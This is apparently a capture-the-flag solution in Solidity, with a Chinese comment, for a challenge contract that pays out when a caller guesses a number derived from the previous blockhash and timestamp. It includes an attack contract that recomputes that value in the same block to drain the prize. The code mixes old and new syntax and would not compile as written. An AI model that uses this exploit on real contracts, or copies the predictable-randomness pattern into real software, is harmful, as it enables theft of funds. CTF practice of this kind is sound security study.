pragma solidity ^0.6.0;

contract guessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
/*可以看到 answer在 guess调用时才生成 及无法在slot中找到
但是在同一个区块之中 所以answer便知道了*/
contract attack
{
   GuessTheNewNumberChallenge  gues;
  constructor(address _add) public
  {
   gues = GuessTheNewNumberChallenge(_add);
  }
function att() public payable {
  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
  gues.guess{value:1 ether}(answer);
}
} 

